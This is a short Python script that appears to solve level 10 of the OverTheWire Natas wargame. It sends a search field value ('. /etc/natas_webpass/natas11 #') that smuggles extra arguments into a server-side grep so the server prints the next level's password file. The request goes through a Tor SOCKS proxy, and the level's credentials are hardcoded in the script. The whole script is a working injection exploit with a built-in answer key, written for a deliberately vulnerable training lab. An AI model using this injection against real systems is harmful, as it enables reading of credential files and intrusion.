#!/usr/bin/python3

import requests
import re

name = 'natas10'
password = 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE'

url = 'http://%s.natas.labs.overthewire.org/' %name

proxies = {'http': "socks5://127.0.0.1:9050"}

resp = requests.post(url, data = {"needle":". /etc/natas_webpass/natas11 #" , "submit":"submit"}, auth=(name,password), proxies=proxies)

content = resp.text
print(content)
# print(re.findall('<pre>\n(.*)\n</pre>', content))


# this will print only the actual password without brackets
# print(str(flag)[2:-2])
# D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
